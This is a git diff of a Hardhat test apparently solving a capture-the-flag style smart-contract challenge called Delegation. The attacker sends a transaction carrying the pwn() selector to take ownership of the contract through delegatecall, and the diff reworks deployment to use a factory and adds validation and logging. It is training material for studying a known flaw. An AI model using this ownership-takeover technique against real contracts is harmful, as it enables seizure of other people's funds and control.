@@ -8,23 +8,33 @@ describe("Delegation exploit", () => {
   async function deployDelegationFixture() {
     const [deployer, attacker] = await ethers.getSigners();
 
-    // Deploy Delegate contract. Pass address(0) as the constructor parameter. This is how DelegationFactory deploys the instance
-    const Delegate = await ethers.getContractFactory("Delegate");
-    const delegate = await Delegate.deploy(ethers.constants.AddressZero);
+    const DelegationFactory = await ethers.getContractFactory("DelegationFactory");
+    const delegationFactory = await DelegationFactory.connect(deployer).deploy();
 
-    // Deploy Delegation contract. Pass Delegate contract address as the constructor parameter
-    const Delegation = await ethers.getContractFactory("Delegation");
-    const delegation = await Delegation.connect(attacker).deploy(delegate.address);
+    // Simulate createInstance to get return value of the function
+    const delegationAddress = await delegationFactory.connect(deployer).callStatic.createInstance(attacker.address);
 
-    return { attacker, delegation };
+    const tx = await delegationFactory.connect(deployer).createInstance(attacker.address);
+    await tx.wait();
+
+    const delegation = await ethers.getContractAt("Delegation", delegationAddress);
+
+    return { attacker, delegation, delegationFactory };
   }
 
   it("Should claim ownership", async () => {
-    const { attacker, delegation } = await loadFixture(deployDelegationFixture);
+    const { attacker, delegation, delegationFactory } = await loadFixture(deployDelegationFixture);
 
     const abi = ["function pwn() public"];
     const iface = new Interface(abi);
     const selector = iface.getSighash("pwn()");
+
+    console.log(
+      "------------------------------------------------------- DelegationFactory : ",
+      delegationFactory.address
+    );
+    console.log("------------------------------------------------------- Attacker : ", attacker.address);
+    console.log("------------------------------------------------------- Owner Before : ", await delegation.owner());
 
     const tx = await attacker.sendTransaction({
       to: delegation.address,
@@ -35,7 +45,11 @@ describe("Delegation exploit", () => {
 
     const newOwner = await delegation.owner();
 
+    console.log("------------------------------------------------------- newOWner : ", newOwner);
+
     // Check if the owner is set.
-    expect(newOwner).to.be.equal(attacker.address, "Failed!!!");
+    const success = await delegationFactory.validateInstance(delegation.address, attacker.address);
+    expect(success).to.equal(true, "Delegation Failed!!!");
+    //expect(newOwner).to.be.equal(attacker.address, "Failed!!!");
   });
 });
